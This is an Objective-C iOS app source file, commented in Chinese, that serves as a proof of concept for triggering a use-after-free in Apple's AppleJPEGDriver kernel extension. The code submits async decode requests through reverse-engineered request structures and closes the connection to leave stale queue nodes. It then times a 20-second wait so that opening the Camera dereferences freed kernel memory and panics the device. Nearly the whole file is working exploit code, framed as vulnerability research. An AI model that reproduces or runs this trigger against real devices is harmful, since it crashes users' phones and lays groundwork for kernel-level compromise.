//
//  jpeg_poc6.m — AppleJPEGDriver UAF 触发（带 20 秒倒计时，卡准时序）
//
//  由来（jpegpoc5 实测 + cameracaptured 崩溃日志分析）：
//    · decode/async 已完全跑通（sync 444/420 + async token≠0 全 SUCCESS）
//    · Phase 4 提交 5 个 async 后立刻关连接，队列里留下 5 个「活着但永不完成」的节点
//    · 打开相机 → BWGraph 等它们 → 超时 → 崩溃栈证实：
//        -[BWGraph _timedOutWaitingForOperationToCompleteWithDescription:]  ← SIGTRAP
//
//    但那只是「卡死」，不是 UAF —— 因为请求还没被 free。
//
//  PoC 的原始时序（源码注释）：
//    "a synchronous decode waits for 10 seconds; timeout cleanup frees the request
//     but does not dequeue the embedded node; and a later finish_io_gated() walk
//     dereferences the stale entry"
//
//  ⇒ 缺的就是那 10 秒。必须让驱动内部的超时清理先跑完（request 被 free、节点留队），
//     之后的队列遍历才会摸到已释放内存。
//
//  本版做法：
//    Phase 1-3  同前（验证 decode 仍可用）
//    Phase 4    提交 5 个 async → 关连接
//    Phase 5    ★ 20 秒倒计时（屏幕上每秒刷新），倒计时归零才提示你开相机
//               —— 这 20 秒是留给驱动内部 10s 超时 + free 完成
//
//  风险：倒计时结束后打开相机，可能 kernel panic（设备自动重启，数据不丢）。
//

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <unistd.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID  IOSurfaceGetID(IOSurfaceRef buffer);
extern void        *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
extern size_t       IOSurfaceGetAllocSize(IOSurfaceRef buffer);
extern kern_return_t IOSurfaceLock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);

static NSString *const kISWidth = @"IOSurfaceWidth";
static NSString *const kISHeight = @"IOSurfaceHeight";
static NSString *const kISBPE = @"IOSurfaceBytesPerElement";
static NSString *const kISPF = @"IOSurfacePixelFormat";

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static const char *kr_name(kern_return_t kr)
{
    switch ((uint32_t)kr) {
        case 0:          return "SUCCESS";
        case 0xe00002bc: return "Error";
        case 0xe00002c1: return "NotPrivileged";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c7: return "Unsupported";
        case 0xe00002c9: return "InternalError";
        case 0xe00002cc: return "NotOpen";
        case 0xe00002d5: return "Busy";
        case 0xe00002d6: return "Timeout";
        case 0xe00002d8: return "NotAttached";
        case 0xe00002e2: return "NotPermitted";
        default:         return "?";
    }
}

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"JPEGP6 %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jpegp6.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_async(gQ, ^{
        [gLog appendString:line];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
        });
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.textColor = [UIColor colorWithRed:0 green:1 blue:0 alpha:1];
            gStatus.font = [UIFont monospacedSystemFontOfSize:22 weight:UIFontWeightBold];
        }
    });
}

typedef struct __attribute__((packed)) {
    uint32_t sourceID, field_04, destID, field_0C, field_10;
    uint32_t width, height, field_1C;
    uint8_t  flags, pad_21[3];
    uint32_t xOffset, yOffset, subsampling;
    uint64_t asyncToken, asyncToken2, field_40;
    uint32_t codecID, outWidth, outHeight, field_54;
} jpeg_req_t;
_Static_assert(sizeof(jpeg_req_t) == 0x58, "must be 0x58");

static IOSurfaceRef makeSourceSurface(NSData *jpeg)
{
    size_t allocLen = (jpeg.length + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{ kISWidth: @(allocLen), kISHeight: @1, kISBPE: @1, kISPF: @0x20202020 };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!s) return NULL;
    IOSurfaceLock(s, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(s);
    if (base) memcpy(base, jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(s, 0, NULL);
    return s;
}

static IOSurfaceRef makeDestSurface(uint32_t w, uint32_t h)
{
    NSDictionary *props = @{ kISWidth: @(w), kISHeight: @(h), kISBPE: @4, kISPF: @0x42475241 };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

static NSData *makeJPEG(uint32_t w, uint32_t h)
{
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

static kern_return_t call_decode(io_connect_t conn, uint32_t sel,
                                 uint32_t srcID, uint32_t dstID,
                                 uint32_t w, uint32_t h,
                                 uint64_t token, uint32_t sub, const char *tag)
{
    jpeg_req_t in; memset(&in, 0, sizeof(in));
    in.sourceID = srcID; in.field_04 = w*h;
    in.destID = dstID;   in.field_0C = w*h*4;
    in.width = w; in.height = h;
    in.outWidth = w; in.outHeight = h;
    in.subsampling = sub; in.asyncToken = token;

    jpeg_req_t out; memset(&out, 0, sizeof(out));
    size_t os = sizeof(out);
    kern_return_t kr = IOConnectCallStructMethod(conn, sel, &in, sizeof(in), &out, &os);
    L(@"  [%s] sel=%u %ux%u sub=%u token=0x%llx -> 0x%08x %s",
      tag, sel, w, h, sub, (unsigned long long)token, (uint32_t)kr, kr_name(kr));
    return kr;
}

static void run(void)
{
    L(@"===== AppleJPEGDriver UAF trigger (with 20s countdown) =====");
    L(@"uid=%d pid=%d", getuid(), getpid());

    CFMutableDictionaryRef m = IOServiceMatching("AppleJPEGDriver");
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
    L(@"[1] service = 0x%08x", svc);
    if (svc == MACH_PORT_NULL) return;

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    L(@"[2] open(type=0) 0x%08x %s conn=0x%08x", (uint32_t)kr, kr_name(kr), conn);
    if (kr != KERN_SUCCESS) { IOObjectRelease(svc); return; }

    // ---- 前置验证：小图 decode 仍可用 ----
    L(@"");
    L(@"=== 前置验证：64x64 decode ===");
    const uint32_t W = 64, H = 64;
    NSData *small = makeJPEG(W, H);
    IOSurfaceRef ss = makeSourceSurface(small);
    IOSurfaceRef sd = makeDestSurface(W, H);
    if (ss && sd) {
        uint32_t sid = IOSurfaceGetID(ss), did = IOSurfaceGetID(sd);
        call_decode(conn, 1, sid, did, W, H, 0, 3, "preflight");
    }
    if (ss) CFRelease(ss);
    if (sd) CFRelease(sd);
    IOServiceClose(conn);

    // ---- Phase 4: 造 stale 状态 ----
    L(@"");
    L(@"=== Phase 4: 提交 async → 立刻关连接 ===");
    const uint32_t BW = 2048, BH = 2048;
    NSData *big = makeJPEG(BW, BH);
    IOSurfaceRef bs = makeSourceSurface(big);
    IOSurfaceRef bd = makeDestSurface(BW, BH);
    L(@"  大图 JPEG: %lu bytes", (unsigned long)big.length);
    if (!bs || !bd) { L(@"  surface 创建失败"); if (bs) CFRelease(bs); if (bd) CFRelease(bd); IOObjectRelease(svc); return; }

    uint32_t bsid = IOSurfaceGetID(bs), bdid = IOSurfaceGetID(bd);
    L(@"  srcID=%u dstID=%u", bsid, bdid);

    io_connect_t c2 = MACH_PORT_NULL;
    kern_return_t k2 = IOServiceOpen(svc, mach_task_self(), 0, &c2);
    L(@"  新连接 0x%08x %s conn=0x%08x", (uint32_t)k2, kr_name(k2), c2);
    if (k2 != KERN_SUCCESS) { CFRelease(bs); CFRelease(bd); IOObjectRelease(svc); return; }

    int submitted = 0;
    for (int j = 0; j < 5; j++) {
        if (call_decode(c2, 1, bsid, bdid, BW, BH, 0x4141 + j, 3, "UAF submit") != KERN_SUCCESS) break;
        submitted++;
    }
    L(@"  已提交 %d/5", submitted);
    IOServiceClose(c2);
    L(@"  ★ 连接已关闭 —— stale 状态建立");

    CFRelease(bs);
    CFRelease(bd);

    // ---- Phase 5: 20 秒倒计时 ----
    L(@"");
    L(@"=== Phase 5: 倒计时 20 秒（等驱动内部 10s 超时 + free 完成）===");
    L(@"  倒计时期间请不要切走、不要锁屏。");
    for (int s = 20; s > 0; s--) {
        SetStatus([NSString stringWithFormat:@"⏳ 还剩 %d 秒\n(等驱动超时清理)", s]);
        if (s % 5 == 0 || s <= 5) L(@"    ... %d 秒", s);
        sleep(1);
    }

    SetStatus(@"📷 现在打开相机！");
    L(@"");
    L(@"  ★★★ 倒计时结束 ★★★");
    L(@"  >>> 现在退出本 App，立刻打开「相机」<<<");
    L(@"     这一次遍历到的应该是已释放的 JpegRequest；");
    L(@"     如果设备黑屏重启，就是 UAF 触发成功。");
    L(@"     重启后我可以用 crash 日志取 panic 证据。");

    IOObjectRelease(svc);
    L(@"");
    L(@"===== done =====");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("jpegp6.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 60, self.window.bounds.size.width - 16, 100)];
    gStatus.numberOfLines = 0;
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"starting...";
    gStatus.textColor = [UIColor greenColor];
    gStatus.font = [UIFont monospacedSystemFontOfSize:22 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 170, self.window.bounds.size.width, h - 170)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:8] ?: [UIFont systemFontOfSize:8];
    gView.editable = NO;
    gView.text = @"";
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
